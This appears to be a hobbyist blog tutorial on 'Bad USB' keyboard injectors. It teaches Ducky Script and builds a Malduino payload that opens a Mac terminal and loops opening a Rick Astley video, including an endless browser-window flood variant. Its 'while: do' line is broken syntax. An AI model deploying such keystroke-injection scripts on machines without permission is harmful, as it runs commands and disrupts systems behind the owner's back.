---
title: "Introduction to Keyboard Injectors with Rick Astley"
date: 2020-02-11
category: "hardware"
excerpt: "Launch a Rick Roll bomb on your computer today!"
---



# DISCLAIMER:
Code in this project utilizes your browser for purposes it was not intended for. Do not plug a bad USB into any computer without the proper permissions from its owner.


## Bad USBs:
A "Bad USB" is a USB drive designed to perform malicious actions when plugged into a USB socket. This can range from frying a motherboard with high-voltage discharge to gaining a remote backdoor.


## Keyboard Injectors
A Keyboard injector is a USB stick programmed to initiate keystrokes at superhuman speeds when plugged in.

![Keyboard-Injector](/images/injector.gif){:class="img-responsive"}

One such device is the [Malduino](https://maltronics.com/collections/malduinos) by Maltronics.

The Malduino Elite has 4 switches corresponding to binary values 1 and 0. Depending on the switch combination, a particular script stored on the micro sd card will execute. For example, 1010.txt for gaining a reverse shell and 1110.txt for DNS poisoning.  
![malduino](/images/malduino_img.jpg){:class="img-responsive"}
## Ducky Script Basics
The Malduino uses a scripting language called ducky script.

### DELAY
DELAY adds a pause in milliseconds to the script. This is useful if you want to give a process time to finish before executing the next line. The following is a delay of 1 second:
```bash
DELAY 1000
```
### STRING and ENTER
STRING is used to simulate characters typed on the keyboard. For example, 
```bash
STRING Hello!
```
would simulate the user typing "Hello!" on the keyboard. 
ENTER emulates the enter key.
```bash
STRING Hello!
ENTER
```
This will become useful once you need to navigate cmd/terminal or a built in search such as Spotlight.
### GUI
GUI simulates the Super key. This would be the command key on Mac and the Windows key on Windows. With this you gain access to various keyboard shortcuts.
```bash
GUI r
STRING cmd
ENTER
```
This script uses the Windows-key+r shortcut to pull up the Windows' “Run” box, type out cmd, and hit enter.
## The Script:
Firstly, access a shell using the methods mentioned above. For Mac, access spotlight then navigate to the terminal with the proper delay times (tweak delays so script runs as fast as possible). 
```bash
DELAY 2000
GUI space
DELAY 500
STRING terminal
DELAY 500
ENTER
```
Next, access a bash shell, in case bash isn't the default shell, and write out the script
*The delays are too long. Make sure to tweak them for efficiency*
```bash
DELAY 500
STRING bash
DELAY 500
ENTER
```
Create a loop to successively open browser windows, where `N` is the number of Windows to open.
```bash
STRING N=0
DELAY 500
ENTER
DELAY 500
STRING while [ $N -le 5 ]; do
DELAY 500
ENTER
```
*Use this to open an endless amount of brower windows*

```bash
STRING while: do
```
Use `open` in bash to open a browser with the specified link. The process may be slightly different on Windows, but the idea is still the same.
```bash
DELAY 500
STRING open https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 500
ENTER
DELAY 500
STRING N=$(( $N + 1 ))
DELAY 500
ENTER
DELAY 500
STRING done
DELAY 500
ENTER
DELAY 500
```
